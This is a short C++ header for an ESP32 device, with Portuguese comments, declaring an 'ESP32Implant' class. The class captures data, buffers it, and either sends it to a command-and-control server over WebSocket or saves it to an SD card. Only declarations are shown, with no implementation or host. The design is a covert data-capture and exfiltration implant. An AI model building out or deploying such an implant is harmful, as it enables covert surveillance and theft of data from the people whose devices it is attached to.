#ifndef IMPLANT_CORE_H
#define IMPLANT_CORE_H

#include <WiFi.h>
#include <WebSocketsClient.h> // Requer a biblioteca WebSockets de Markus Sattler
#include <SD.h>
#include <SPI.h>

#define BUFFER_THRESHOLD 1024 * 10 // 10KB para envio automático
#define SD_CS_PIN 5

class ESP32Implant {
public:
    ESP32Implant(const char* ws_host, uint16_t ws_port, const char* ws_url);
    void begin();
    void update();
    void logData(String data); // Captura e decide se envia ou salva

private:
    WebSocketsClient _webSocket;
    String _dataBuffer;
    const char* _host;
    uint16_t _port;
    const char* _url;

    void sendToC2();
    void saveToSD(String data);
    static void webSocketEvent(WStype_t type, uint8_t * payload, size_t length);
};

#endif
